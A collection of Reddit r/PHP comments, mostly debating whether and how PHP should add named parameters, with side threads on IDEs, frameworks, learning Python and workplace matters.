 Thanks for the feedback, but that really is not scalable when you have 30 different methods, all of which have different combinations of parameters and some of which are only used once. If I take 5 methods and create getters and setters I get this: protected $userId; protected $screenName; protected $cursor; protected $skipStatus; protected $includeUserEntities protected $statusId; protected $trimUser; protected $sinceId; protected $maxId; protected $continuation; public function getUserId(); public function setUserId($userId); public function getScreenName(); public function setScreenName($screenName); public function getCursor(); public function setCursor($cursor); public function getSkipStatus(); public function setSkipStatus($skipStatus); public function getIncludeUserEntities() public function setIncludeUserEntities($includeUserEntities); public function getStatusId(); public function setStatusId($statusId); public function getTrimUser(); public function setTrimUser($trimUser); public function getSinceId(); public function setSinceId($sinceId); public function getMaxId(); public function setMaxId($maxId); public function getContinuation(); public function setContinuation($continuation); I would definitely prefer named parameters over this implementation. Furthermore the number of arguments in this one method is not the cause of the problem. Even if I only just had the first two in this method, I would still want to use named parameters. Notice how I want user_id OR screen_name? How else am I meant to do that with traditional arguments in PHP? There is the current approach: $api-&gt;getFriends(null, 'phpdrama'); The undocumentable string approach: $api-&gt;getFriends('screen_name:phpdrama'); The randomly creating an undocumentable array of stuff approach: $api-&gt;getFriends(['screen_name' =&gt; 'phpdrama']); The OOP-overload approach: $user = new Twitter\UserParameter::screenName('phpdrama'); $api-&gt;getFriends($user); Again, named parameters would certainly be a lot nicer than all of this arsing around.
Those are all great reasons and I agree that the following would not work: $api-&gt;getFriends($screen_name='phpdrama', $include_user_entities=true); That is already valid PHP syntax so it would have huge BC implications.
&gt; Now, I ask you, what fate would you have given him? Ok. Without knowing more than you revealed, I would keep this employee on staff with a warning and give _you_ a _final_ warning as well. Now I of course know nothing of the circumstances, but there are many "I"'s and "mine" in your comments describing what ultimately led to this person's firing. I take it you and possibly other team-mates built some custom framework or server or site structure and now you call it "yours". I take it you personally now expect new-hires to obey _your_ custom structure even though you have no authority in your organization to make that demand. New-hire did not obey your parameters, so they were fired at _your_ insistence. From a reader's perspective, the employee simply did not fit into your team based on your complaints or you personally didn't like them, so you personally got them fired. Is that the case? Getting way off topic for a PHP post, but the way this was handled as described seems extremely unethical. 
Verbose code isn't a bad thing. Well, not always a bad thing. I am fed up with writing getters/setters, but it's hard to disagree that this code: $u = new User(); $u -&gt;setScreenName("headzoo") -&gt;setCursor(-1) -&gt;setSkipStatus(false) -&gt;setIncludeUserEntities(false); $friends = $u-&gt;getFriends(); Is harder to understand than this code: $u = new User(); $friends = $u-&gt;getFriends("headzoo", -1, false, false); At the end of the day it's all about writing easy to understand and self documenting code. The amount of code you have to write is kind of irrelevant. Named parameters can certainly make methods with long argument lists easier to work with: $u = new User(); $friends = $u-&gt;getFriends(screen_name =&gt; "headzoo", skipstatus =&gt; false); But I can understand why the PHP devs want to avoid adding a new (possibly confusing) syntax to solve a problem that really isn't a problem.
Indeed, and I'm not saying that's not a valuable attribute. But I think we should be guiding people towards better practises, rather than coddling them to allow them to tread water. OOP, esp with established libraries like this by contrast to building something of your own, is not difficult. By acting like it is and giving people options that we think they'll like, we actually hold them back. Inexperienced developers can and should learn best practise. Stubborn developers... that's a whole other story, but suffice it to say they shouldn't be coddled either. I think "sliding" into a better paradigm is a mistake. I think there comes a point where you have to shake people a bit. Might as well be sooner rather than later.
Any course of action taken to get named parameters implemented is A OK with me. The question I've had is what does the function prototype for a function with named parameters look like? The same?
Exactly. I was just too lazy to provide an example... Also, holy crap, I forgot they added [ , , , ] syntax for arrays. Wonderful.
Exactly where I picked up the habit. I do some nodejs stuff along side my PHP.
Named parameters is one of those odd features that I dislike for no logical reason. It simply doesn't feel like "the php way". On the plus side it's one of those features no one is forcing you to use. If you don't like named parameters then don't use them, and I wouldn't want to see a language feature sidelined simply because I don't personally see a use for it. On the negative side constantly having to search through documentation for the names of the parameters could be a real pain. Some type of IDE support would make things much easier though.
i use sublime text for programming my php so i don't have typehinting, i don't mind using associative arrays as a single parameter which could be later turned into normal variables by doing something like this foreach($args as $n =&gt; $a) { $$n = $a; } so if $args = ["name" =&gt; "Liam", "age" =&gt; 22]; after running the foreach loop you would be able to use $name; // (string) "Liam" $age; // (int) 22 a lot of people may dislike this but its been working pretty well for me, just add an isset ternary and you're done
Right. So tell me, if the namespace is "webapp" and 4 other frameworks use that namespace........ how does namespacing prevent collisions again?
[Type-hinting](http://php.net/manual/en/language.oop5.typehinting.php) is a feature of PHP and has nothing to do with your IDE and it's ability to handle static analysis. That foreach loop does exactly what [extract()](http://us3.php.net/extract) does, so you might want to use that instead. :)
my mistake i was confusing type-hinting to code-hinting or whatever the IDE autocomplete is called, and extract looks nice, thanks
I've been hearing "the php way" a lot recently and its a bit odd. Callbacks and anonymous functions were not really "the php way" until they were added. Namespaces were not something PHP did, until they were added. New stuff is new :) It might be annoying to have to look stuff up in the docs, but if you're using a method you're either looking at docs for the method or you've opened up the code to have a look anyway. Named parameters do not add any complication to the use of methods that does not already exist, and if they can help folks stop using random arrays of options it will actually improve the usage/documentation situation.
Your example is sadly unrealistic in this instance. As I said this API has 30 methods which have totally different arguments, so there would be 50+ get/set methods. Ignoring the fact that it would be disgusting, its incredibly hard to document what methods will have an effect on which other methods. Can getFriends have a max_id or a since_id? Can it have include entities? Does it use cursor or page? There is no standard way to document which methods could be used to modify the behaviour of the other method, but with named parameters you just need to look at the function declaration or API docs to know exactly what parameters there are. Named parameters are obviously a huge simplification over making a truly crazy number of getters setters. Just because you _can_ achieve something with existing functionality does not mean syntax cannot improve the process.
EDIT: I have been warned that there may be too much info here. It is gone.
&gt; It simply doesn't feel like "the php way". The thing is, it already is. I have seen plenty of PHP code in frameworks and libraries that have a method that takes a single array parameter of keys and values for just this purpose. Named parameters would just formalize and make smarter something that is already done regularly. Personally, I hate methods that take single array parameters because it's so easy to get wrong. A typo in a key and some value doesn't get set and you would never notice. That sort of error is the old "PHP way" and something we should strive to avoid. 
Woah. It's cool you're providing an expatiation. Just be careful about providing _too_ much info in your wall of text that can be used to personally identify and/or damn you. We in /r/php are just armchair judges, not your creator or employer. In fact I think you should delete this comment asap since it's too personal and regards sensitive employment topics. A simple "that's not the way it is" response would suffice.
You have my sword, shield, ax, hell, even my fucking ball sack if you need it to get this thing done. I would recommend a format like this, however: $api-&gt;getFriends($screen_name =&gt; 'phpdrama', $include_user_entities =&gt; true); Because all variables in PHP are identified by the $ symbol and not including it in a named parameter that will then be passed to the function as $screen_name and $include_user_entities seems to be a unnecessary violation of that expectation. The named parameters arguments have never made any sense to me, because including it would not violate the KISS principle since it would almost always be used by those who are trying to make their own packages conform to the KISS principle. Or is this: $api-&gt;getFriends(null, 'phpdrama', -1, false, true); somehow easier to understand than this? $api-&gt;getFriends($screen_name =&gt; 'phpdrama', $include_user_entities =&gt; true); Another thing is that, now that PHP supports type-hinting, being forced to use a mechanism that is inherently unhintable removes one of the biggest advances in PHP development.
&gt; No, actually. It does not. Sorry, you're right, I wasn't reading carefully, I was talking about the generic question mark placeholder.
The problem with this is that `$screen_name` and `$include_user_entities` aren't variables in the current scope. So you've swapped one confusion for another. The best way to do it I think is just array syntax. $api-&gt;getFriends('screen_name' =&gt; 'phpdrama', 'include_user_entities' =&gt; true);
Agreed. I am glad I wasn't putting words in your mouth. G'day sir.
Look at how foreach-as works. It creates new variables in a new scope, that's exactly what this syntax is doing as well. So +1. I've actually mentioned this foreach-like syntax in another thread in the past.
I've been waiting for at least a "default" keyword for ages. 
 &gt; $api-&gt;getFriends($screen_name =&gt; 'phpdrama', &gt; $include_user_entities =&gt; true); Hey better yet, how about this syntax? $api-&gt;getFriends(Array('screen_name' =&gt; 'phpdrama', 'include_user_entities' =&gt; true)); Oh wait. You *already can* do that. :P
First one makes the most sense to me. Unlike that Nick guy in the article comments, I don't see a problem with aping array syntax - it's already familiar and it's *essentially* what we're trying to do here anyway, passing in a sort-of-array of vars and having PHP handle assigning them to the correct param based on their key. Introducing new syntax such as the colon definitely seems like a bad idea.
Python is in many ways more KISS than PHP will ever be, so this argument of the RFC discussion is moot. I totally agree with phil on this one. Months ago, i had a small mail exchange with nikic, about parameter packing and unpacking and we were same standpoint that those features would be a great addition to PHP. After all, he wrote the RFCs for it, which i'm very happy about (thanks btw :) ). Named parameters are in the same category named "darn useful features php needs". Named parameters, parameter unpacking etc. are features which would add immense power to php and reduce abuse of other features (Reflection for dynamic parameter constructor calls, associative arrays as single parameter to "simulate" named parameters) to get the same thing, so they should be implemented.
It can provide for any url you like, it's doing no more magic than checking a regex against a url. If you want ? &amp;= to be / of course, you need to use mod_rewrite/equivalents. 
A few comments on this blog post (with a bit of internals perspective): &gt; Well, if its my only option I guess I will, but how does it look: &gt; [Here is a really ugly code using extract() and or short-circuiting] The "normal" way you implement an $options array in PHP looks like this: public function getFriends($options) { $options += [ 'user_id' =&gt; null, 'screen_name' =&gt; null, 'cursor' =&gt; -1, 'skipstatus' =&gt; false, 'include_user_entities' =&gt; false ]; // ... } This looks a lot better and is cleaner than the weird `isset ... or` assignments. The difference in call syntax between named parameters and an options array is rather small: $api-&gt;getFriends(screen_name =&gt; 'phpdrama', include_user_entities =&gt; true); // vs $api-&gt;getFriends(['screen_name' =&gt; 'phpdrama', 'include_user_entities' =&gt; true]); The named-params version is a *tad* bit shorter. I don't think this is relevant. The value of named parameters really comes from two things: * The default values are documented in the function *signature*, rather than the code * You can use named params on any (also existing) function, whereas $options has to be explicitly implemented for every function. Both of these are rather important. The first point, because we all love self-documenting code and the latter because it allows you to improve readability at the call-site even in cases where implementing $options is not worth it. Example: $str-&gt;indexOf('Foo', true); // vs $str-&gt;indexOf('Foo', caseInsensitive =&gt; true); Here it would not make much sense to introduce `$options` because there is just one option, but named args allow you to properly document the call site for any and all functions with optional arguments. So, that was some comments on the feature in general. Now let's get to [named parameters RFC](https://wiki.php.net/rfc/namedparameters) discussed there: This RFC is just plain **outdated**. Nothing more than that. At least as far as I can judge, core is not really opposed to named args. I've seen two mails by Stas and Pierre recently mentioning that we should consider named args. (Note: If you don't know, Stas is one of the rather more conservative folk on the internals list.) The hold up with named parameters is not that we're again it, it's just *hard to implement*. (As such I'm also not sure how much help creating an RFC for it would be, if it doesn't come with an implementation. But you should try anyway.) If there's interest I could outline why named parameters are somewhat hard from an internal perspective. Blub.
I was doing that in frameworks ten years ago, so yes, it certainly is a "PHP way", but just has not had the syntax to make it cleaner. I wonder if it can be emulated using reflection, just to demonstrate the idea to non believers, and to show the PHP core devs how unmessy it could be? 
An RFC without a patch is just noise, to me it doesn't much matter what is written in the RFC ... I'm not sure named parameters are a good idea; I come to that conclusion with some idea of what it will take to implement ... but if a patch comes along .... or even if someone starts, I'll join in, because I'd rather be a person working on code than a person talking about the implications and ramifications of a non-existent patch ...
&gt; Have the website work without JavaScript, but enhance the experience if it does. I have always liked this in theory, but it rarely works in practice. Disabling js usually destroys the application (and I mean applications, not orinary web sites).
That's why I said that he should do it if it's not a RIA.
Or, if you do MVVM, you save yourself the need to write code specifically for presenting the data in JSON, as the code is a bit more decoupled from the presentation. Instead, it switches presentation based on rendering strategies, which is essentially just a class which looks at the request and figures out how the application should present its data, usually by reading the Accepts-header. So, if you request the page via jQuery's .getJSON(), you get JSON data back instead of HTML. 
I would be interested to read what the difficulties are too. Thank you.
That's a nice wheel you've reinvented there... Well done. 
Sixth, you really should just start using PhpStorm, it is an amazing IDE, the office I work at just changed to PhpStorm and it has really made a lot of things more easy.
Which is why many of us switched to Python, it's truly a case of the grass being greener on the other side of the fence ;)
The point of '...' is that it is already used in other languages as mentioned above (ecmascript 6, D and C++). I certainly find it more readable than anything that you suggested. 
Before anything, you are going to have to figure out how the current codebase works. The best way to do this is to write tests. These tests will have to be very high level. For example: "The 5 latest articles appear in the latest news section". These high level tests will give you the power and confidence to rewrite the internals without having to worry about breaking the entire application.
Just out of curiosity, do you have the ability to integrate ORM objects, framework-specific code completion, or break points in Vim? I ask because while I use both PHPStorm and Vim, I haven't found a way to bring those specific features to Vim.
That way you will overwrite arguments values from function call with the defaults one.
Out of the box on two different computers, file tree would be slow or not recognize new files/folders even when created within ST
it was done as an exercise. not trying to reinvent the wheel, but more on understanding how one works and how to make one.
As /u/public_method pointed out, the opposite is true. Feel free to test it.
f($a,...$num,$b,...$args,$x); Which argument number is $x? Unknown.
The RFC says somebody needs to update it, so I'm going to update it. As I said if it can just provide more useful information than a grumpy "I don't like it so whaaaa" then people can at least see what is happening. I see value in that. One step at a time.
Oh you chose to ignore half of the comments, part of the article and even ignore PHP's short array syntax? Thanks for that.
There seems to be a belief that there are no restrictions, and everything can be implemented well ... maybe we should go on the record and say it: **not everything can be implemented well**, if a programmer, cannot see the logical pathway from that to **not everything should be implemented** then there is probably a better career out there for them ...
Were you referencing files over a network share of some kind?
I'm trying to make the switch as well. Well, not really a switch, since I'm going to keep updating my PHP knowledge as well since I have a lot of faith in it. My question to you is what resource do you recommend to learn Python after learning PHP?
I've changed my example to use `$args += []`. I'm not sure what I was on about with the issets, but my use of `or` there is a personal taste thing which people often bitch at me for. It's a shorter way of setting defaults than ternaries, but not as short as `$args += []`. &gt; As such I'm also not sure how much help creating an RFC for it would be, if it doesn't come with an implementation I can't see that it would hurt. As I said I don't expect it to magically solve everything but having the information on the pros and cons to allow for a real conversation on it instead of just seeing "We do not want it" will help others. Maybe I can troll around and find somebody to help with the implementation afterwards, as they'll be more motivated to work on it if the answer doesn't seem like "No" before they even start. &gt; But you should try anyway.) If there's interest I could outline why named parameters are somewhat hard from an internal perspective. I'd love that information. Blog?
If I am volunteering some of my time to outline the pros and cons of a discussion on a topic I am interested in, that is not a waste of time. If I choose to do that on the RFC wiki instead of as another blog (as the RFC actually requests) then I should be able to do so. To have you push back and call my offer to help out 'just noise' is unexpected, and not appreciated. Feel free to ignore it entirely until a patch is added (if/when that happens), I'm just working on clearing the roadblocks for anyone who is genuinely interested in doing so.
nope, local copies. just had about 10 top level project folders and several hundred files which can nest into about 10 or 15 directories deep. it was hit/miss on slowness.. but it happens more often than not.
Holy crap. Thats something I haven't actually seen before. Were you able to do that in the past with the old array() syntax?
Even cleaner. I like it. 
Lol thanks 
Thanks. It was late and this thing's been killing me. I appreciate your concern. At least you got to read it.
There are a few Vim plugins that will integrate with XDebug, so you can set breakpoints in specific places. As for framework-specific code completion, I believe you should be able to set this up using exuberant ctags. Not sure about ORM objects, though. Vim does have some extremely powerful completion options. Whole line completion (Ctrl-X Ctrl-L) was one of the most useful things I ever learned, and Vim's omnicompletion supports most programming languages out of the box.
Yes.
not true. you can already declare and use variables in the function call: function get($id); [...] get($id = 1);
I know some of the syntactical choices have a lot of pros and cons, and this is what I am interested in documenting. Here is my list of potential syntaxes for this, and some notes on the conversations: https://gist.github.com/philsturgeon/6405087 I can't find much more discussion than this. Most of the "no, we're not doing this" is just based on people seeing other people saying "no, we're not doing this." and one link to some minutes from a 2005 paris conference. Many of the people involved who said no earlier have since come forward and said they'll be happy to if a decent implementation comes along. Updating the RFC to reflect the change in attitude makes sense IMO.
"Ideas Are Easy, Implementation Is Hard" -- Guy Kawasaki
Cool, thanks.
I am so against passing arrays of arguments to functions. Even if the key names make the meanings more obvious, what keys are expected is not obvious. This has a tendency to violate the contract between the function and its caller. Functions should be as explicit as possible about what they expect to receive and what they will return. This starts to dip into the "exception vs. sentinel value" debate also. For more information about all of this, read http://en.wikipedia.org/wiki/Design_by_contract.
Just to add that the comparion of the `:arg =&gt; 'value'` option with Ruby needs to be treated a little cautiously, as `:arg` would be equivalent of a Ruby *symbol*, a specific concept that PHP does not (yet) have. Otherwise quoted strings are the usual approach everywhere else in PHP, which helps to avoid the confusion with constants and keywords. 
How can you be explicit about return values in PHP? Only via docblocks. How can you be explict about scalar parameters? Only via docblocks. Without language support for these, design by contract in PHP is somewhat woolly. At least arrays can be typehinted and their values documented in docblocks. Not saying this is a good thing!
This does raise the interesting question of whether the syntax could/should support variable interpolation via double quotes or variable reference. Just trying to think of a use-case where you might want to set only one argument but decide which argument programmatically ...
The last one. Most likely something like this would be used with variadic functions.
Ah right below the ad it explains: &gt; Programmers obsess over the discrete and the digital well past the point of diminishing returns. &gt; &gt; Thus, small investments in the analog yield comparatively large gains. &gt; &gt; Here's a starter list of analog activities to try, each of which takes about a month of dedicated effort to transition out of the novice (and into the seasoned beginner) stage: &gt; &gt; Cooking. &gt; Hiking. &gt; Skiing. &gt; Astronomy. &gt; Jogging. &gt; Carpentry. &gt; Martial arts. &gt; Dance.
There is an obvious trend of moving definition from the docblock to syntax, which has been going on since PHP 4. * @access public Don't need that anymore, we have accessability scopes. * @param Something $foo This is no longer just docblock, but can be achieved with syntax too. [Varidics](https://wiki.php.net/rfc/variadics) were hard as hell to docblock, but soon syntax will take care of that too. With the ongoing move from mega-docblocks to self-documenting code, named parameters are just another obvious step down the same path PHP has been on for a long time.
Agreed! Though we seem to have hit a wall with some crucial things, like typehinting scalar values or return values, which makes interfaces less handy than they could be (think how HTTPKernelInterface really needs the docblock to be complete, as returning a Response object from handle() is fundamental to its contract, but not currently enforceable). Guess that's something else to look forward to! 
Thanks for answering mjburgess. I'm using mod_rewrite for rewriting. I thought PHP routers are used for: - requiring right .php files for requested page - doing permalinks on the PHP level, rather then using full mod_rewrite (rewrite condition and rewrite rule)
Is there some kind of authority/registry of project names preventing two projects from colliding? Namespaces change nothing. If he called his class gluephp (no namespaces), it would be EXACTLY THE SAME as if he used a namespace called gluephp... Zero. Difference.
I was perfectly aware of that, which is why I quoted that exact part.
This is not the same thing. In this case you're creating a new variable at the site of the invocation. In the example by /u/allsecretsknown there are no new variables being created nor variables at the site of the invocation being referenced, which is why that syntax proposal sucks.
It boggles my mind that this needs pointing out, but here goes: If you go to a website written in English, with an English-speaking community, you don't proceed introduce yourself in *Russian*.
I am sorry, i not know that english speak users read my post. :)
&gt; no new variables being created Yes there are, right there, in the function scope. You're literally saying "hey function, since you have parameters titled $screen_name and $include_user_entities, I want them to use the following values." It's not really logical that they will look one way in the function prototype: function getFriends($screen_name, $include_user_entities){} and differently when you're naming them in the function call: $api-&gt;getFriends($screen_name =&gt; 'phpdrama', $include_user_entities =&gt; true); Furthermore, it will cause confusion for a lot of IDEs is you use plain strings as the named parameters because of the restricted keywords in PHP, e.g. $private_investigator-&gt;startNewCase(case = 'diamond_theft'); would throw some IDEs for a loop since case is a restricted keyword. And simply going to the string route will make the syntax very close to the current array syntax, making it very likely that those lines could be mistaken for arrays rather than named parameters: $api-&gt;getFriends('screen_name' =&gt; 'phpdrama'); //name parameter compared to: $api-&gt;getFriends(['screen_name' =&gt; 'phpdrama']); //array
What it really boils down to - don't let work be the only time or place that you program. Do it at home, too. Learn new things, stay passionate. It's really easy to stagnate and burn out if you only program for other people and never for yourself.
Weird. I've never experienced any problems like that over the local file system. I often work on projects with thousands of files (current project is coming in at 5852 files) spread across hundreds of nested directories (often 10-20 directories deep). The only time I've had it be flakey and force me to manually refresh the file list is if my project files are on a network share. ...and even then, it's always been fast. The reason I use ST over any other text editor is its speed and responsiveness. That said, I've only ever really used Sublime Text seriously on OSX and Ubuntu.
About Symphony as a framework to learn, the prevailing opinion on /r/php seems to be that Laravel is the preferred framework if you are free to choose any one you want. I haven't tried it myself yet, but that seems to be the consensus typically.
1. False. The splat operation is nothing more than that and can be used outside of function calling. It's an array operation and that is it. Don't lie to me. (It's clearly confusing to you, and others. Valid reason to not use this notation.) 2. True. However list() functionality can be extended to do exactly this. 3. I rather not write nor maintain such non-explicit code because it does not help anyone understand what's happening. The code is not self-documenting and becomes a debugging hell very quickly. I stand by my conclusion that the rfc contains great ideas, however the implementation lacks clarity.
I actually find phpstorm to be as fast and the added functionality just makes it worth it. Especially since i can map magento core and only track theme+modules
I'd add getting involved with your local PHP user group to that list. If you don't have a local PHP user group, start one.
Woah... If I had to work with Magento for 2 years straight, I would end killing myself. As everyone usually says, the best way to improve is to read other people's code. Contribute to open source projects that you find interesting by fixing bugs and "soak" yourself with the way other people code to improve the way you code.
Maybe start with learning how to write in english. If it's not your native language, I officially apologize. =) &gt;I didn’t **knew** what to answer. I **know** what was bothering me, but I **didn’t had a plan** to solve it and quitting was not the solution. 
What I'm saying is, rather than writing an RFC, and spending many years discussing it's implications, and having to listen a thousand different inputs from across the PHP world, wouldn't it be more productive to get together a small team who can work on bringing the RFC and patch together for review by the rest of the world ... Like I said, me and many others have no problem writing code for an idea that isn't ours, we wouldn't be working on or with PHP if we couldn't do that ... I just think that having a conversation with a thousand people is of limited use, and until there is a patch a conversation is all that can happen, when there is a patch people tend not to concentrate on what could or should be possible but what the patch actually makes possible and how it can be improved, that's a much more productive discussion I think ... To be absolutely clear, it is obviously appreciated by me and any other user of PHP when anyone volunteers their time for any reason, any reason at all ... just logistics; why would I try to have a conversation with an entire community, a community with opinions so diverse that you could never catalog them all and certainly never hope to please them with any implementation of anything ... I wouldn't, I would go about it in the way I suggested, it's better to do that from every angle I think, it's not that easy to keep the whole community focused on a subject for more than, say, a morning ... it means that the RFC and patch come along, people talk about it, you make adjustments, you get approval, you open a vote, no traction lost and your ideas become reality in no time ...
&gt; Furthermore, it will cause confusion for a lot of IDEs This is a terrible argument. Frankly the IDEs can be fixed to avoid this.
PhpStorm plugin for seamless integration between the database and models, code-inspection and some auto-completing features. Java isn't new to me, but writing plugins for the IntelliJ platform is. I really like it though, although the documentation could be alot better (its getting better though)
That may be. But when the question comes up, it always seems to be Laravel that gets the most upvotes, which isn't much different than the accuracy of any other type of poll. I don't have any particular opinion towards Laravel myself. Personally, when I researched the options, Yii seemed to be the most impressive to me, but it doesn't seem to be a very popular choice currently. 
Is it weird that when I'm not at work, I don't touch PHP? I read about it, here mostly, but I don't use it. I think I've grown to like PHP more since taking a job working with it exclusively, but I consider myself language agnostic and when choosing a language for a personal project PHP is never my top choice. I think Python has my heart right now. Used to be Ruby. It's weird how that happens. Before PHP was a Big Deal (think 1998 when it was 3.x and register globals was still on by default), Perl was my crush. I like what is going on right now in upcoming PHP RFCs, the language continues to evolve beyond its limits, so that's a great thing. Where I work, we do things with PHP that even a few years ago might have been thought insane. Facebook paved that road in a big way, they gave people new confidence in PHP. Sorry for not answering the question at all, but one thing I've learned through my travels as an engineer, especially lately, is that you have to labor against becoming a one-trick pony. Learn the patterns, the techniques, and the gotchas of engineering in the abstract. The language you use to implement your solution matters little. We hire a lot of people with strong Java backgrounds and it leaks into their code, like a Java accent. A predilection for unnecessarily vigorous control of attribute and method visibility, over-use of constants, attempts to control variable typing... Things that PHP is not designed for, or that can cause great woe later on in a big project. Know what your language can do and don't fight it. Apply the time-tested patterns of decoupling, separation of concerns, and maybe a sprinkle of design-by-contract. [Learn to refactor](http://sourcemaking.com/refactoring). [Learn more design patterns](http://www.php5dp.com/category/design-patterns/). Learn a new language. Your choice. Trying something new teaches you more about what PHP offers and what it doesn't, and can help you see problems in a new way.
Building the new login website for Disney. Some PHP, mostly Javascript for my part of the job. We have other PHP developers writing the middle-tier code.
@work: a new b2b site for independant artists allowing them to connect, collaborate, create and promote @personal: too many to list so one off the top: building an API around Ottawa's OpenData so it is easier to grab programmatically.
dont read the gang of four book. its so dry. i dont think anyone actually reads that book actually. read head first design patterns. 
The "Don’t know nothing about caching" bit also annoyed me. He's Romanian, but it's always nice to improve.
Once I get home from training I will be building a website to release mods for nuke Evo, going to learn how to code for ip board, vbulletin, and smf. Also going to make public web tools. Not sure what kind yet, so if you have ideas let me know lol. 
[jQuery-File-Upload](https://github.com/blueimp/jQuery-File-Upload) is what this is intended to support (and their included procedural PHP script is the source of this refactor), but needless to say it works with normal upload forms too.
Yeah, they'd have to be fixed, whereas by default most will understand $vars to be variables and won't throw a fit about it.
Ah. No worries. Sorry if I was overly harsh.
That is not in any way an answer to the question
If you want to give a Python web project a shot, you can try Django. The Python community is quirky, but they have a rationality about them that is unmatched, and it comes through in Django. There are some super lightweight web frameworks written in Python, also, if you wanted to ease in. Flask and Bottle are nice. No ORM, very do-it-yourself. If you wanted to dip into something like that in the PHP world I recommend Slim Framework, or for Ruby there's Sinatra. Try something that *interests you*, or especially that helps you solve a problem that you actually have, no matter how trivial. I have learned most of what I know by doing projects to solve my own trivial first-world problems, like building a website to control my lights using an X10 USB transmitter (I did that one with the CherryPy Python framework and a Python USB driver for the X10 transmitter). Subscribe to the hacker ethic. Be aware of things in your life that need optimization, and if you can, optimize them. Sometimes you can do this with code, and in those cases, jump on the opportunity to solve a problem and learn something at the same time. That's my advice.
I just started a new job on Wednesday... at a Magento shop. I hope I don't hate it. I jumped ship on a job I hated for this one... 
a function-oriented metaframework (architecture dsl)
I had a similar issue and ended up with a protected array of valid "options". I used __set and __get as my setters/getters and checked the array of options to see if it was setting/getting a valid option. 
I'm currently working on a tool whose sole purpose is to store and retrieve text. I wanted an entirely self-hosted system and decided to write my own. Currently the only thing I've really worked on is the server, which I'm writing in PHP. I'm not using any framework as I find the overhead unacceptable for something where for me speed is the ultimate concern. I decided I wanted to build something after becoming frustrated at how difficult it is to copy and paste text between my phone, tablet and computer, even though they're often within a metre of each other. I also needed a side-project after months of being driven batty by Magento at work. Development is slow unfortunately, and I haven't had time to work on a frontend at all (currently my plan for the first frontend program will be a desktop application written in Java), so I still feel like I haven't really achieved much. I don't know if anyone will be interested, but you can find the project at https://github.com/djmattyg007/textdrop I'd really appreciate some help or at least some pointers. I'm fully aware that my authentication system is terrible, for example.
I get what you're saying and it sounds a lot more reasonable than it sounded earlier. I however am coming from a totally opposite point of view. I would much rather ask around, find out the pros/cons, whys and wheres of the history of this in an attempt to sort out the future. The RFC suggests there have been loads of conversations explaining why this would be a terrible idea and after a whole [admittedly hungover and lazy] morning of searching I couldn't find shit of any use, other than the already mentioned 2005 minutes from a conference in paris where somebody decided "Nah its gross we dont want it". So, step 1 is to clear the roadblock that this will just never happen. That is done by updating that RFC, as opinions have changed since then and most of the negative nancy's have changed their minds since then. Step 2 is to find out what the best implementation should be, specifically with what syntax. Step 3 is to make the implementation happen, by bribing and coercing people smart and experienced enough to get the job done. I'm all about finding the people for a small team to implement named parameters, but first we have to buck the opinion that this is a non-starter. Then we can ask the communities opinion on what syntax makes sense. Then we can do it. I've already started putting together [some notes](https://gist.github.com/philsturgeon/6405087) on the subject, and examples of syntax - with pros and cons. Feedback would be appreciated.
*Some will suggest going a step further and changing to PDO instead, but that will be a lot more work and won't get you anything except the oft-touted, never-used ability to switch to a new database engine.* This may not be used often, but it is used. I worked on a project as a subcontractor a few years back, on which our original specs were for a typical LAMP stack deployment. About 75% of the work was done when we were informed that actually it would be deployed on Windows instead of Linux and with Oracle instead of MySQL and that wouldn't be a problem, right? It was, but it might have been even more of a problem if we hadn't used PDO from the start. I don't know that I'd change an existing project to use PDO (although if they did good work on the DB layer that might not be a huge undertaking), but I don't think I'd start a new project with anything but PDO these days unless there was some really compelling reason to do so.
Netbeans has been working out great for me.
It depends on the group but I run mine so that there's benefits for new PHPers and veterans. Mine runs once a month with the following itinerary: First 45 minutes: Beginner topic and discussion 30 minutes: food/intros/networking/PHP news Last 45 minutes: Advanced topic and discussion For anyone that wants to stick around: Help on projects/horror stories/fun stuff they learned since last month Essentially a mini-conference. Some groups are less formal and it's just hanging out and talking shop for an hour or two but I like to run a tight ship with some time allotted for BSing just so you're getting your time's worth for coming. It's great to get to know PHPers in your community for networking purposes, to get to learn new stuff, catch up on the news in the PHP world (New RFCs/bugfixes/releases/etc.), talk shop with other people to see how other developers do their thing, and to be introduced to new technology. Never used Mongo with PHP before? Maybe someone there has. Maybe there's someone using Laravel and you want to know more. I wouldn't be in the job I'm currently in if it weren't for my local PHP user group and as a thanks to them I took over the duties when the previous organizer stepped down. If you're in a hiring position it's great to see potential candidates as well.
/r/python, /r/learnpython, http://www.diveinto.org/python3/, http://learnpythonthehardway.org/book/ should get you started, though probably the hardest thing to get your head around will be the execution model (a python 'app' is running continually, where as a php 'app' is started up on each request) :) For what it's worth, I wrote http://simoncoulton.github.io/watson/ which helped me transition across from PHP to Python. 
I know what you are getting at. Sure, pick the right tool for the job, but Laravel is a GREAT place to start if you want to see what PHP frameworks do.